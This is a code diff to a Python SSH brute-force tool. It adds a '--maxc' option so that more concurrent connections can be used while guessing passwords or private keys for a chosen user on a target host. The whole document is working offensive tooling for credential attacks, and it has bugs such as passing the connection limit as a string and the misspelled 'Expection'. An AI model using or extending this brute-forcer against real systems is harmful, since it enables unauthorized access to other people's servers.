@@ -113,12 +113,16 @@ def ssh_pass(host,user,passwdFile):
         for t in threads:
             t.join()
 
-def bruteSSH(host,user,*,passKeyDir=None,passwdFile=None):
+def bruteSSH(host,user,*,passKeyDir=None,passwdFile=None,maxConnection=10):
     if passKeyDir==None and passwdFile==None:
         print('[-] Wrong parameters.')
 
+    global MAX_CONNECTION,CONNECTION_LOCK
     global Found,Fails
     global PASSWD,KEYFILE
+    if maxConnection!=10:
+        MAX_CONNECTION=maxConnection
+        CONNECTION_LOCK = BoundedSemaphore(value=MAX_CONNECTION)
     ret = {'host':host,'user':user,'type':None,'key':None}
     if passKeyDir:
         ssh_key(host,user,passKeyDir)
@@ -150,18 +154,20 @@ def main():
     parser.add_option('-F',dest = 'passwdFile',type='string',help='specify password file')
     parser.add_option('-d',dest = 'passKeyDir',type='string',help='specify directory with keys')
     parser.add_option('-u',dest = 'user',type='string',help='specify the user')
+    parser.add_option('--maxc',dest = 'maxConnection',type='string',help='specify the max connections')
     (options,args)=parser.parse_args()
     host = options.tgtHost
     passwdFile = options.passwdFile
     passKeyDir = options.passKeyDir
     user = options.user
+    maxConnection = options.maxConnection
 
     if host==None or (passwdFile==None and passKeyDir==None) or user==None:
         print(parser.usage)
         exit(0)
 
     try:
-        bruteSSH(host,user,passwdFile=passwdFile,passKeyDir=passKeyDir)
+        bruteSSH(host,user,passwdFile=passwdFile,passKeyDir=passKeyDir,maxConnection=maxConnection)
     except KeyboardInterrupt:
         pass
     except Expection as e:
